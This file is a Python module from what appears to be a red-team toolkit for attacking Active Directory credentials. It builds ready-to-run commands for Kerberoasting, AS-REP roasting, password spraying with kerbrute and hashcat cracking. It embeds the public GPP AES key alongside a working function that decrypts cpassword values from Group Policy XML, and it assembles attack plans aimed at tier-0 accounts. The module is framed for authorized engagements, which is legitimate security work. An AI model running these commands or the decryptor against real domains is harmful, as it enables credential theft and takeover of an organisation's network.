"""AD credential-attack helpers: command builders + GPP password decryption.

The command builders are *planners* (they emit the exact command an operator, or
a future C2 module, should run) — they never execute. Execution stays behind the
engagement authorization + the C2 integration (phase 3). The one active piece is
GPP ``cpassword`` decryption, which is offline (the AES key is published by
Microsoft) and needs only ``pycryptodome``.
"""

from __future__ import annotations

import base64
import xml.etree.ElementTree as ET
from typing import Any, Dict, List, Optional

# Public Microsoft GPP AES key (MS-GPPREF / "cpassword").
_GPP_KEY = bytes([
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10,
    0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
])


# -- command builders -------------------------------------------------------
def kerberoast_command(domain: str, dc: str, user: str, password: str,
                       spn_users: Optional[List[str]] = None) -> List[str]:
    cmd = ["impacket-GetUserSPNs", f"{domain}/{user}:{password}", "-dc-ip", dc,
           "-request", "-outputfile", "kerberoast.hashes"]
    if spn_users:
        cmd += ["-usersfile", "spn_users.txt"]
    return cmd


def asrep_command(domain: str, dc: str, users_file: str = "users.txt") -> List[str]:
    return ["impacket-GetNPUsers", f"{domain}/", "-dc-ip", dc,
            "-usersfile", users_file, "-format", "hashcat", "-outputfile", "asrep.hashes"]


def spray_command(domain: str, dc: str, users_file: str, password: str) -> List[str]:
    return ["kerbrute", "passwordspray", "-d", domain, "--dc", dc,
            users_file, password]


def crack_command(hashes_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
                  mode: str = "13100") -> List[str]:
    """hashcat: 13100 = Kerberos 5 TGS-REP (Kerberoast), 18200 = AS-REP."""
    return ["hashcat", "-m", mode, "-a", "0", hashes_file, wordlist, "--force"]


# -- GPP cpassword ----------------------------------------------------------
def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a GPP ``cpassword`` with the public Microsoft AES key."""
    if not cpassword:
        return ""
    try:
        from Crypto.Cipher import AES  # type: ignore
    except Exception as exc:  # pragma: no cover - optional dep
        raise RuntimeError(
            "GPP decryption needs pycryptodome (pip install 'valen[ad]')"
        ) from exc
    padded = cpassword + "=" * ((4 - len(cpassword) % 4) % 4)
    data = base64.b64decode(padded)
    plain = AES.new(_GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
    return plain.decode("utf-16-le", errors="ignore").rstrip("\x00")


def gpp_from_xml(xml_text: str) -> List[Dict[str, Any]]:
    """Extract (user, cpassword, plaintext) from a GPP Groups/Services XML."""
    out: List[Dict[str, Any]] = []
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return out
    for el in root.iter():
        cp = el.get("cpassword")
        if not cp:
            continue
        user = el.get("userName") or el.get("name") or el.get("accountName") or ""
        try:
            plain = decrypt_cpassword(cp)
        except Exception:  # noqa: BLE001
            plain = ""
        out.append({"user": user, "cpassword": cp, "plaintext": plain})
    return out


# -- attack plan ------------------------------------------------------------
def attack_plan(ad, entries: Optional[List[str]] = None) -> Dict[str, Any]:
    """Deterministic AD attack plan: roastable creds + ranked tier-0 paths."""
    from .collect import asrep_roastable, kerberoastable
    from .paths import (
        attack_paths,
        betweenness_ranking,
        cheapest_paths,
        chokepoints,
        hitting_rank,
        synthesize_attack,
    )

    spn = kerberoastable(ad)
    asrep = asrep_roastable(ad)
    paths = attack_paths(ad, entries)
    bridges = betweenness_ranking(ad)
    return {
        "kerberoastable": [{"name": u["name"], "domain": u["domain"]} for u in spn],
        "asrep_roastable": [{"name": u["name"], "domain": u["domain"]} for u in asrep],
        "paths": paths,
        "pivot_bridges": bridges,
        "chokepoints": chokepoints(ad, entries),
        "hitting": hitting_rank(ad, entries),
        "cheapest_paths": cheapest_paths(ad, entries),
        "synthesized_plans": synthesize_attack(ad, entries),
    }
